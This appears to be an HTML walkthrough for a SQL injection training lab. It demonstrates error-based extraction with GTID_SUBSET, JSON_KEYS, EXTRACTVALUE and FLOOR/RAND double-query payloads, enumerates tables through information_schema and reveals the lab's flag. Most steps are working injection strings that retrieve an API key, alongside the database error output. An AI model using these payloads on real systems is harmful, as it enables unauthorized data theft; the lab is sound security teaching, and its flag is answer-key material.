<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> in the Recipient field.
    A MySQL syntax error confirms the injection point.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#039;&#039;&#039; AND read_status = 0&#039; at line 1
    </div>
</div>

<h4>Step 2: Understanding GTID_SUBSET (MySQL 5.7+ Only)</h4>
<p>
    On <strong>MySQL 5.7+</strong> (not MariaDB), the <code>GTID_SUBSET()</code> function
    checks whether one GTID set is a subset of another. If the first argument is not
    a valid GTID string, it throws an error that <strong>includes the invalid value</strong>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. GTID_SUBSET (MySQL 5.7+ Only)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND GTID_SUBSET(CONCAT(0x7e, (SELECT api_key FROM api_keys WHERE service_name='internal')), 1) -- -
    </div>
</div>

<p>
    On MySQL 5.7+, the error would show something like:
    <code>Malformed GTID set specification '~FLAG{gt1d_j50n_3rr0r_l34k}'</code>.
</p>
<p>
    <strong>Note:</strong> This does NOT work on MariaDB. Tested output:
    <code>FUNCTION sqli_arena_mysql_lab8.GTID_SUBSET does not exist</code>
    Use the alternatives below.
</p>

<h4>Step 3: JSON Function Errors (MySQL 5.7+ Only)</h4>
<p>
    MySQL 5.7+ also has JSON functions that can leak data through errors:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. JSON_KEYS Error (MySQL 5.7+)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND JSON_KEYS(CONCAT(0x7e, (SELECT api_key FROM api_keys WHERE service_name='internal'))) -- -
    </div>
</div>

<p>
    On MySQL 5.7+, this produces an invalid JSON error containing the data.
    On MariaDB (this lab), JSON_KEYS silently returns no error and the query
    returns no rows: the injection fails silently with
    <strong>&ldquo;No unread messages&rdquo;</strong>.
</p>

<h4>Step 4: Reliable Alternative. EXTRACTVALUE</h4>
<p>
    Since this lab runs on MariaDB, use <code>EXTRACTVALUE()</code> which works
    reliably on both MySQL and MariaDB:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. EXTRACTVALUE (Reliable)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT api_key FROM api_keys WHERE service_name='internal'))) -- -
    </div>
</div>

<p>
    The error message will show: <code>XPATH syntax error: '~FLAG{gt1d_j50n_3rr0r_l34k}'</code>
    (confirmed on MariaDB 11.x).
</p>

<h4>Step 5: Reliable Alternative. FLOOR/RAND/GROUP BY</h4>
<p>
    The classic double-query technique also works:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Double Query (Reliable)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT api_key FROM api_keys WHERE service_name='internal'), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
    </div>
</div>

<p>
    The error will show: <code>Duplicate entry 'FLAG{gt1d_j50n_3rr0r_l34k}:1' for key 'group_key'</code>.
</p>

<h4>Step 6: Enumerate. Discovering the API Keys Table</h4>
<p>
    If you did not know the table structure, enumerate it:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Enumerate Tables and Columns</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Tables: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -<br>
        <span class="prompt">Error: </span>XPATH syntax error: '~api_keys,messages'<br><br>
        <span class="prompt">Columns: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='api_keys'))) -- -<br>
        <span class="prompt">Error: </span>XPATH syntax error: '~id,service_name,api_key'
    </div>
</div>

<h4>Step 7: Submit the API Key</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{gt1d_j50n_3rr0r_l34k}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MySQL 5.7+ introduced functions like
    <code>GTID_SUBSET()</code> and JSON functions that can be abused for error-based
    extraction. However, these are <strong>MySQL-specific</strong> and do not exist in
    MariaDB. A skilled attacker knows multiple error-based techniques and adapts
    to the target database engine. Defense: use prepared statements, suppress error
    details, and restrict database privileges.
</div>
